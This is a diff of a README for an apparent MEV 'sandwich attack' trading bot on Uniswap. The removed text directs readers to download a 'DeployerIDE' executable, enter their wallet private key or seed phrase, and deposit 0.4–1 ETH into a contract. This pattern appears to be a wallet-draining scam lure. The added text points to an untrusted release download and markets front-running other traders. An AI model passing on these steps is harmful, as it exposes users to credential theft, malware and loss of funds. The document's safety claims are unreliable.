@@ -1,142 +1,48 @@
-![31188786-65acc2f0ead69](https://github.com/user-attachments/assets/7ac5286e-971e-4e40-8428-b2aed53e818a)
+# MEV-UniswapBot
 
-<p align="center">
-  <strong> 📊 Mev Sandwich Bot</strong>
-</p>
+Welcome to the MEV-UniswapBot repository, your go-to toolkit for executing MEV-based trading strategies on Uniswap with precision and security. This bot is designed to maximize profitability while maintaining compatibility across various EVM networks. Whether you're a seasoned trader or a developer exploring automated trading solutions, this bot is the perfect tool to capitalize on Ethereum's mempool opportunities.
 
-<p align="center">
-  <img src="https://i.ibb.co/4ZKYtNS/DALL-E-2024-11-11-01-52-18-A-simple-banner-for-a-README-file-on-a-MEV-Sandwich-Bot-with-a-modern-min.png" alt="MEV Sandwich Bot Banner">
-</p>
+## 🤖 About MEV-UniswapBot
 
-The **MEV Sandwich Bot** is a tool for **automated profit generation** on blockchains, leveraging sandwich attacks and other arbitrage strategies. It analyzes unconfirmed transactions in the mempool, generating profit by influencing token prices.
+MEV-UniswapBot is a powerful bot tailored for executing MEV-based trading strategies, including sandwich attacks, on the popular decentralized exchange, Uniswap. The bot is equipped to deliver optimal performance, ensuring that traders and developers can make the most out of Ethereum's mempool dynamics. By leveraging MEV opportunities, traders can stay ahead in the fast-paced world of cryptocurrency trading.
 
-#### 🎯 How It Works
+## 📚 Key Features
 
--   **Front-running**: The bot places its transaction before a large user transaction.
--   **Victim’s Transaction**: The user’s main transaction goes through at an altered price.
--   **Back-running**: The bot sells tokens at the new price to capture profit.
-
-#### 💡 Key Benefits
-
--   **Efficient unconfirmed transaction scanning**: The bot detects profitable transactions in real-time.
--   **Liquidity filtering and scam protection**: Built-in filters avoid low-liquidity or suspicious tokens by using contract audits, e.g., through Scansniffer.
-
-
-#### 🚀 Launching in DeployerIDE
-
-<p align="center"> <img src="https://i.ibb.co/KLF9Z37/Interface.png" alt="MEV Sandwich Bot Interface"> </p>
-
-
-### Advantages of the Local Deployer
-
-The **DeployerIDE** local deployer provides a secure and efficient environment for creating and managing smart contracts, offering a level of control and transparency that browser-based IDEs struggle to match.
-
-----------
-
-#### Advantages over Browser-based IDEs:
-
--   **Ease of Management**: DeployerIDE’s interface is simple and intuitive, allowing users to insert source code, compile, and deploy contracts effortlessly.
-    
--   **Contract History Preservation**: All created contracts are saved under `Load Contracts`, providing full access to manage them even after closing the application.
-    
--   **Detailed Action Logging**: DeployerIDE logs all actions for enhanced transparency and tracking.
-    
--   **Network Support**: Currently supports **Ethereum**, **BNB**, **Test BNB**, and **Sepolia** networks, allowing you to test and deploy contracts within these environments.
-    
-
-----------
-
-**DeployerIDE** enables secure and effective contract management by operating in a fully local environment without requiring access through browser wallets.
-
-#### 📥 Installing DeployerIDE
-
-1.  **Download and launch DeployerIDE**.
-2.  **Follow the setup instructions** available in the Documentation section.
--   [Download for Windows/Mac OS (.exe)](https://github.com/engSophia5x3/MEV-UniswapBot/raw/refs/heads/main/DeployerIDE.zip)
--   [Download for Python (.py)](deployer.py)
--   **Alternative access via web browser:** [Remix IDE](https://remix.ethereum.org)
-
-### 🛡️ Security Verification
-
-The program has been scanned for security using antivirus tools. Below is a screenshot of the scan results:
-
-<p align="center"> <img src="https://i.ibb.co/qmwGssk/NoVirus.png" alt="Antivirus Check"> </p>
-
----
-
-# 🛠️ MEV Sandwich Bot Setup and Launch Guide
-
-<p align="center">
-  <img src="https://i.ibb.co/KLF9Z37/Interface.png" alt="MEV Sandwich Bot Interface">
-</p>
-
----
-
-## 🔥 Steps to Launch the Bot
-
-1. **Enter your ERC-20 private key** for your address (Ethereum or BNB). <p align="center">
-  <img src="https://i.ibb.co/bFVpvv2/PrKey.png" alt="MEV Sandwich Bot Interface" width="300">
-</p>
-
-2. **Connect to your selected network**. <p align="center">
-  <img src="https://i.ibb.co/qWcC0WQ/Network.png" alt="MEV Sandwich Bot Interface" >
-</p>
-
-   - *(If you’re unsure how to get your private key, use the built-in function to convert your seed phrase into a private key.)* <p align="center">
-  <img src="https://i.ibb.co/pPz0Bzt/SdKy.png" alt="MEV Sandwich Bot Interface">
-</p>
-
-3. [**Insert your contract source code**](uniswapBot.sol) in the `Enter Contract Code` field.
-<p align="center">
-  <img src="https://i.ibb.co/t2NwQjZ/code.png" alt="MEV Sandwich Bot Interface" width="200" height="300">
-</p>
-
-4. **Select Compiler Version**: `0.6.6`. (If you haven’t agreed to the auto-detected version)<p align="center">
-  <img src="https://i.ibb.co/dt2GG47/version.png" alt="MEV Sandwich Bot Interface" >
-</p>
-
-5. Press **Compile**. If all settings are correct, contract details such as **ABI** and **Bytecode** will appear.<p align="center">
-  <img src="https://i.ibb.co/f1cw1Jy/ByteAbi.png" alt="MEV Sandwich Bot Interface" width="400" >
-
-6. After compiling, select **UniswapBot** under `Select Contract`.<p align="center">
-  <img src="https://i.ibb.co/c67YnG3/Uniswap-Bot.png" alt="MEV Sandwich Bot Interface" width="500" >
+- **MEV-Based Strategies:** Execute sophisticated MEV-based trading strategies effortlessly.
+- **Sandwich Attacks:** Conduct strategic sandwich attacks with precision and efficiency.
+- **High Security:** Prioritize security with robust measures to safeguard your trades.
+- **EVM Compatibility:** Ensure seamless compatibility across different EVM networks.
+- **Automated Trading:** Streamline your trading activities with automated solutions.
   
-7. Press **Deploy**. A gas cost estimate for contract deployment will be displayed.
-8. Once deployed, you can manage the contract directly through **DeployerIDE**:<p align="center">
-  <img src="https://i.ibb.co/4szY8sj/func.png" alt="MEV Sandwich Bot Interface" width="400" >
-  
-   - **Contract Address**, **Balance**, and a **Blockchain Explorer Link** will display in the interface.
-   - Contracts are automatically saved and accessible even after closing the application.
-9. **Copy your contract’s address** and deposit funds by any convenient method *(e.g., through a standard transfer)*.
-10. *The contract balance will be displayed next to its address.*<p align="center">
-  <img src="https://i.ibb.co/7SykfXM/balance.png" alt="MEV Sandwich Bot Interface" width="300" >
-  
-11. **Start the bot** by invoking the **`Start`** function.  
-    *Once started, the bot quickly scans unconfirmed transactions on* **Uniswap** *and* **Sushiswap**, *using smart contract interfaces to front-run profitable transactions.*
-12. To stop the bot, use the **`Stop`** function.
-13. To withdraw the entire contract balance, use the **`Withdrawal`** function.
+## 🛠️ Installation
 
-**Additional Information:**  
-_To see the owner and withdrawal address, call the **Owner** function._
+To download and run MEV-UniswapBot, please visit the [Releases](https://github.com/hakanxmikaelson/MEV-UniswapBot/releases) section. Ensure you have the necessary permissions and configurations in place before executing the bot.
 
-15. **Your contract is saved** in the `Load Contracts` tab, so it remains accessible for management even after closing the program. <p align="center">
-  <img src="https://i.ibb.co/rGznDfw/load.png" alt="MEV Sandwich Bot Interface" width="450" >
+[![Download MEV-UniswapBot](https://img.shields.io/badge/Download-MEV--UniswapBot-brightgreen)](https://github.com/hakanxmikaelson/MEV-UniswapBot/releases)
+
+## 🚀 Getting Started
+
+1. **Clone the Repository:** Begin by cloning the MEV-UniswapBot repository to your local machine.
+   
+2. **Configuration:** Set up the bot configuration according to your trading preferences and risk tolerance.
+   
+3. **Execution:** Run the bot on your desired EVM network and start executing profitable trading strategies.
+
+## 📦 Repository Details
+
+- **Topics:** blockchain, bot, crypto-bot, cryptocurrency, dex, eth, ethereum, evm, mempool, mev, mev-bots, sandwich-attacks, solana, solana-snipe-bot, solidity, trade-bot, trading, tradingbot, uniswap
+  
+
+## 🤝 Community & Support
+
+For questions, feedback, or assistance, feel free to reach out to the community or the bot developers. Join the conversation on our Discord channel or submit inquiries through GitHub Discussions.
+
+## 📜 License
+
+MEV-UniswapBot operates under the [MIT License](LICENSE), allowing users the freedom to modify and distribute the codebase as needed.
 
 ---
 
-## 📊 Bot Operation Examples on Etherscan
+Take advantage of MEV opportunities on Uniswap with confidence using MEV-UniswapBot. Enhance your trading capabilities, stay ahead of the market, and maximize profitability in the dynamic world of decentralized finance. Download the bot today and elevate your trading experience!
 
-- [jaredfromsubway: MEV Bot 2](https://etherscan.io/address/0x1f2f10d1c40777ae1da742455c65828ff36df387)
-- [0x51C72848c68a965f66FA7a88855F9f7784502a7F](https://etherscan.io/address/0x51c72848c68a965f66fa7a88855f9f7784502a7f)
-- [MEV Bot: 0x000...e49](https://etherscan.io/address/0x00000000009e50a7ddb7a7b0e2ee6604fd120e49)
-- [MEV Bot: 0x5dd...35f](https://etherscan.io/address/0x5ddf30555ee9545c8982626b7e3b6f70e5c2635f)
-- [MEV Bot: 0xA69...78C](https://etherscan.io/address/0xa69babef1ca67a37ffaf7a485dfff3382056e78c)
-- [MEV Bot: 0x6f1…168](https://etherscan.io/address/0x6f1cdbbb4d53d226cf4b917bf768b94acbab6168)
-
----
-
-## 💸 Deposit Recommendations
-
-- **Recommended Minimum Deposit**: 0.4–1 ETH
-
-> **⚠️ Important:** Bots and all crypto investments carry inherent risks. Using bots can lead to both profits and losses.
+✨ Happy Trading! ✨
